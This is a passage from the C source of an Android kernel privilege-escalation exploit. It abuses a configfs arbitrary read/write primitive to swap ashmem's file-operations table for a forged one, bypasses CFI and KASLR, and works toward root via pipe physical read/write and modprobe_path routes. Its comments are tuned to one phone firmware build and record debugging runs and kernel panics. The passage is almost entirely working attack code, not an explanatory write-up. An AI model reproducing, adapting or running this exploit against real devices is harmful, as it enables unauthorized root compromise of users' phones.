          binwrite_target + sizeof(payload) - 1, sizeof(payload));
  ssize_t n =
      configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  rmg_diag("CFI scratch write ret=%zd errno=%d target=%016zx\n", n, errno,
           binwrite_target);
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;
  rmg_diag("CFI llseek repair begin slot=%016zx fake_fops=%016zx\n",
           fake_fops + FOPS_LLSEEK_OFF, fake_fops);
  if (!repair_fake_fops_llseek(fd)) {
    rmg_diag("CFI llseek repair FAILED errno=%d\n", errno);
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  rmg_diag("CFI llseek repair OK\n");
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;
  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
      walk_read_kernel_bytes(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback)) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }
  if (scratch_is_ours) {
    /* Content compare is meaningless for a self-owned target - see the long
     * comment above. Report what we saw and move on. */
    rmg_diag("CFI scratch readback SKIPPED (self-owned target, AAR self-writes "
             "are no-ops): got=%02x%02x%02x%02x want=%02x%02x%02x%02x\n",
             readback[0], readback[1], readback[2], readback[3], payload[0],
             payload[1], payload[2], payload[3]);
  } else if (memcmp(readback, payload, sizeof(payload)) != 0) {
    rmg_diag("CFI scratch readback MISMATCH on a foreign target\n");
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  } else {
    rmg_diag("CFI scratch readback verified on a foreign target\n");
  }
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (!restore_p0_oracle_pages(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }
#endif
  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  pr_info("cfi restoring misc_fops target=%016zx value=%016llx\n", misc_fops,
          (unsigned long long)
              original_fops); /* rmg_diag (fsync'd to the durable log) rather
                                 than pr_info: the stage this   * runs in is the
                                 one that panics, and printk output is exactly
                                 what the panic   * truncates. The whole CFI
                                 sequence used to vanish, leaving only   *
                                 "fops-pre-pin-little" as the last line. */
  rmg_diag("CFI restore begin misc_fops=%016zx value=%016llx fakepp=%016zx\n",
           misc_fops, (unsigned long long)original_fops, fake_fops);
  /* Restoring ashmem_misc.fops THROUGH THE AAR KILLS THE KERNEL on GZH2, and the
   * asymmetry with the slide is what proves it.
   *
   * The slide puts fake_fops into misc_fops perfectly well - but that store is
   * performed by KERNEL code (the forged rbtree erase), not by us. The restore
   * goes through configfs_write_once, whose copy_from_iter writes to
   * buffer->bin_buffer + ki_pos, and bin_buffer is pinned by the strscpy ladder
   * to `target & ~0xFFFFFF` = 0xffffffc00a000000 for this target. That is INSIDE
   * the kernel image, and the image's read-only mapping is exactly what the
   * hardened AAR runs into. The plan line is the last thing logged:
   *     WR target=ffffffc00ac0cf28 base=ffffffc00a000000 pos=0xc0cf28 len=8
   * and "CFI restore write ret=" never appears, so the process dies inside the
   * pwrite. Writes to DIRECT-MAP targets (0xffffff88...) are fine - that is why
   * every other write in this payload works and only this one dies.
   *
   * So the AAR cannot be used to write kernel-image addresses on this device;
   * only kernel-side writes can. A correct restore therefore has to reuse the
   * slide's kernel-side primitive, which is a separate piece of work.
   *
   * Until then, skip it by default so the stage can reach install_child_root and
   * the walk - leaving misc_fops pointing at our table, which is acceptable for
   * the duration of the exploit because the table is a full working ashmem
   * table (read_iter/write_iter/unlocked_ioctl/release all resolve to the real
   * implementations). Set CFI_FORCE_AWR_RESTORE=1 to attempt the old path.
   */
  const char *force_restore = getenv("CFI_FORCE_AWR_RESTORE");
  /* Whether the AAR restore was deliberately skipped. The success check near
   * the end of this function has to expect fake_fops when it was, otherwise the
   * skip below is unconditionally fatal (see the comment there). */
  int restore_skipped = 0;
  /* Reported downstream as the restore result, so the stage's success condition
   * is unchanged. A skip is recorded as satisfied-and-deliberate, not as a
   * silent pass: the log line below says which happened. */
  ssize_t restore = (ssize_t)sizeof(original_fops);
  if (force_restore && *force_restore && force_restore[0] == '1') {
    restore =
        configfs_write_once(fd, misc_fops, &original_fops, sizeof(original_fops));
    cfi_restore_ret = restore;
    rmg_diag("CFI restore write ret=%zd errno=%d (forced AAR path)\n", restore,
             errno);
    if (restore != (ssize_t)sizeof(original_fops)) {
      cfi_last_step = 5;
      cfi_last_errno = errno;
      goto fail;
    }
    uint64_t before = 0;
    ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
    fops_before = before;
    rmg_diag("CFI restore readback ret=%zd errno=%d got=%016llx want=%016llx\n",
             rb, errno, (unsigned long long)before,
             (unsigned long long)original_fops);
    if (rb != (ssize_t)sizeof(before) || before != original_fops) {
      cfi_last_step = 6;
      cfi_last_errno = errno;
      goto fail;
    }
  } else {
    cfi_restore_ret = 0;
    restore_skipped = 1;
    rmg_diag("CFI restore SKIPPED (AAR cannot write kernel-image addresses; "
             "misc_fops left pointing at fake_fops=%016zx)\n",
             fake_fops);
  }
#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }
#endif
  if (!kaslr_done) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }
#if defined(QEMU_STACK_WRITER_ONLY) && QEMU_STACK_WRITER_ONLY
  if (!fake_fops_owner_is_zero(fd)) {
    cfi_last_step = 7;
    cfi_last_errno = errno;
    goto fail;
  }
  SYSCHK(close(fd));
  cfi_last_step = 0;
  cfi_last_errno = 0;
  atomic_store(&cfi_stage_done, 1);
  pr_success("QEMU_STACK_WRITER_OK backend reached verified configfs ARW\n");
  return 1;
#endif
  pr_info("cfi starting pipe physrw\n");
  rmg_diag("FOPS stage=pipe-physrw begin cfi_step=%d errno=%d\n", cfi_last_step,
           cfi_last_errno);
  fflush(NULL);
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#if defined(FUTEX_POISON_PROBE)
  /* Poison build: always take the oracle route. futex_poison_probe() now lives
   * inside run_p0_pipe_oracle_diagnostic(), behind the forge, so this route must
   * be reached unconditionally - depending on P0_ORACLE_DIAG being exported into
   * the payload process is exactly the kind of thing that silently turns into
   * "the probe never ran" with no diagnostic at all. */
  if (1) {
#else
  /* FUTEX_TRIGGER arms the default-off live futex-PI route, which lives inside
   * run_p0_pipe_oracle_diagnostic() behind this same forge. Accept it here so an
   * operator needs one knob rather than two: FUTEX_TRIGGER=1 reaches the forge and
   * the v14 trigger without also having to set P0_ORACLE_DIAG=1. */
  if (getenv("P0_ORACLE_DIAG") || getenv("FUTEX_TRIGGER")) {
#endif
    int diagnostic_ok = run_p0_pipe_oracle_diagnostic(fd);
    fflush(NULL);
    _exit(diagnostic_ok ? 0 : 1);
  }
#endif

#if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE

#ifndef PIPE_FIRST_LEAK_ATTEMPTS

#define PIPE_FIRST_LEAK_ATTEMPTS 12

#endif
  /* With the deterministic walk enabled we do not need the order-3 grooming   *
   * child at all: the victim comes from walking init_task -> files -> fdtable
   * * -> pipe_inode_info. That child (1216 clones + skb sendmsg + KernelSnitch)
   * * is also the stage that panics most often, so skipping it is the whole   *
   * point. install_pipe_physrw() runs the walk and only grooms as a fallback.
   */
  /* PIPE_DETERMINISTIC selects the structural walk.   *   * It is now the
     DEFAULT (1). The legacy groom+SLUB-scan path is what dies on   *
     F946BXXS7GZH2 - prepare_pipe_buffer_page() panics in almost every run, and
     * the order-3 grooming child (1216 clones + skb sendmsg + KernelSnitch) is
     * itself a major panic source. The walk needs no heap preparation at all,
     so   * skipping it removes both failure modes.   *   * The walk only
     performs 8-byte reads, which is the only read width that   * comes back
     intact through this AAR; the struct offsets it uses are taken   * from the
     BTF blob embedded in this firmware's own kernel Image rather than   *
     scanned for. Set PIPE_DETERMINISTIC=0 to force the legacy path back on for
     * comparison. */
  const char *det_env = getenv("PIPE_DETERMINISTIC");
  int pipe_deterministic = (det_env && *det_env) ? atoi(det_env) : 1;
  /* The pipe physrw stage is OFF by default, and the reason is measurement, not
   * preference. Both of its two modes are closed on F946BXXS7GZH2:
   *   - PIPE_DETERMINISTIC=1 runs the structural walk, whose first act after
   *     resolving tasks_head is a 784-byte read of a usercopy-hardened
   *     task_struct. That read does not return; run 9 logged
   *       RD target=ffffff89ff7016d0 page=... len=784
   *     with no following "RD pread ret=" and the device rebooted.
   *   - PIPE_DETERMINISTIC=0 runs the legacy groom+SLUB scan, which fails its
   *     cache gate identically 12 times every run:
   *       pipe caches normal1k=0000000000000000 ... selected=ffffffffffff62f0
   *       phys reclaim pass=N/4 cache gate FAILED ...
   *     and costs ~10 minutes before install_child_root() is ever entered.
   * The walk-free modprobe_path route needs neither, so it must not be queued
   * behind either. ROOT_PIPE=1 restores the old behaviour for a comparison run.
   */
  const char *rp_env = getenv("ROOT_PIPE");
  int pipe_stage_enabled = (rp_env && rp_env[0] && rp_env[0] != '0');
  if (!pipe_stage_enabled) {
    /* Forcing the deterministic flag here suppresses BOTH stages: the
     * first-leak loop below is the legacy branch, and the retry re-groom inside
     * the install loop is gated on the same variable. install_child_root()
     * honours the same knob, so install_pipe_physrw() never runs either. */
    pipe_deterministic = 1;
    rmg_diag("FOPS pipe physrw stage DISABLED (ROOT_PIPE unset): skipping the "
             "legacy first-leak loop, the walk and install_pipe_physrw; the "
             "walk-free modprobe route is reached immediately\n");
  } else if (pipe_deterministic) {
    rmg_diag("FOPS skipping order-3 grooming (deterministic walk enabled)\n");
  } else {
    for (int first_leak_attempt = 0;
         first_leak_attempt < PIPE_FIRST_LEAK_ATTEMPTS; first_leak_attempt++) {
      if (first_leak_attempt != 0) {
        reset_pipe_attempt();
      }
      rmg_diag("FOPS entering prepare_pipe_buffer_page n=%d\n",
               first_leak_attempt + 1);
      pipebuf_page_base = prepare_pipe_buffer_page();
      rmg_diag("FOPS prepare_pipe_buffer_page attempt=%d/%d base=%016zx\n",
               first_leak_attempt + 1, PIPE_FIRST_LEAK_ATTEMPTS,
               pipebuf_page_base);
      pr_info(
          "fresh physrw pipe after verified fops page=%016zx "
          "attempt=%d/%d\n",
          pipebuf_page_base, first_leak_attempt + 1, PIPE_FIRST_LEAK_ATTEMPTS);
      if (is_direct_ptr(pipebuf_page_base)) {
        break;
      }
    }
  }
  if (!pipe_deterministic && !is_direct_ptr(pipebuf_page_base)) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }
#endif
  int installed = 0;
  pipe_stage_attempts = 0;
  rmg_diag("FOPS entering install_child_root loop max=%d\n", PIPE_MAX_ATTEMPTS);
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
#if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE
      /* Only re-groom when the deterministic walk is off; otherwise the retry
       * * should just walk again (cheap) rather than fork 1216 children. */
      if (!pipe_deterministic) {
        pipebuf_page_base = prepare_pipe_buffer_page();
        rmg_diag("FOPS retry prepare attempt=%d/%d base=%016zx\n", attempt + 1,
                 PIPE_MAX_ATTEMPTS, pipebuf_page_base);
        pr_info("fresh physrw retry page attempt=%d/%d base=%016zx\n",
                attempt + 1, PIPE_MAX_ATTEMPTS, pipebuf_page_base);
        if (!is_direct_ptr(pipebuf_page_base)) {
          continue;
        }
      }
#endif
    }
    rmg_diag("FOPS calling install_child_root attempt=%d page=%016zx\n",
             attempt + 1, pipebuf_page_base);
    if (install_child_root(fd)) {
      installed = 1;
      rmg_diag("FOPS install_child_root OK attempt=%d\n", attempt + 1);
      break;
    }
    rmg_diag(
        "FOPS install_child_root FAIL attempt=%d gate=%d rd=%d wr=%d "
        "rd64=%d wr64=%d\n",
        attempt + 1, pipe_cache_gate_ok, physrw_read_ok, physrw_write_ok,
        physrw_read64_ok, physrw_write64_ok);
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }
  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }
  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  /* Expect the value the restore step says we left behind.
   *
   * This used to require canon_addr(ASHMEM_FOPS) unconditionally, which made the
   * deliberate restore SKIP above unconditionally fatal: install_child_root()
   * could return success here and the run still fell into fail:, whose `dirty`
   * branch performs the exact AAR kernel-image write that the skip exists to
   * avoid (see the comment at "Restoring ashmem_misc.fops THROUGH THE AAR").
   * With the skip taken, misc_fops still points at fake_fops BY DESIGN and that
   * is what the read legitimately returns, so that is what must be accepted. */
  uint64_t expect_fops = restore_skipped ? (uint64_t)fake_fops
                                         : (uint64_t)canon_addr(ASHMEM_FOPS);
  if (ra != (ssize_t)sizeof(after) || after != expect_fops) {
    rmg_diag("CFI post-check mismatch ret=%zd got=%016llx want=%016llx "
             "restore_skipped=%d\n",
             ra, (unsigned long long)after, (unsigned long long)expect_fops,
             restore_skipped);
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }
  int owner_ok = fake_fops_owner_is_zero(fd);
  SYSCHK(close(fd));
  if (owner_ok && restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;
fail:
  /* Always say WHY we are here before touching misc_fops again.
   *
   * This path restores ashmem_misc.fops with no log line of its own, so a failure
   * anywhere in the stage used to present as "the device rebooted right after the
   * last successful line" - and if the panic then happened during this restore,
   * the real culprit (some earlier cfi_last_step) was completely invisible. The
   * panic truncates printk, which is why rmg_diag (fsync'd) is used here. */
  rmg_diag("CFI FAIL path step=%d errno=%d dirty=%d can_read_back=%d "
           "write_ret=%zd read_ret=%zd owner_ret=%zd restore_ret=%zd\n",
           cfi_last_step, cfi_last_errno, dirty, can_read_back, cfi_write_ret,
           cfi_read_ret, cfi_owner_ret, cfi_restore_ret);
  if (dirty) {
    uint64_t original_fops_fail = data_addr(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(fd, misc_fops, &original_fops_fail,
                                          sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    fake_fops_owner_is_zero(fd);
  }
  SYSCHK(close(fd));
  return 0;
}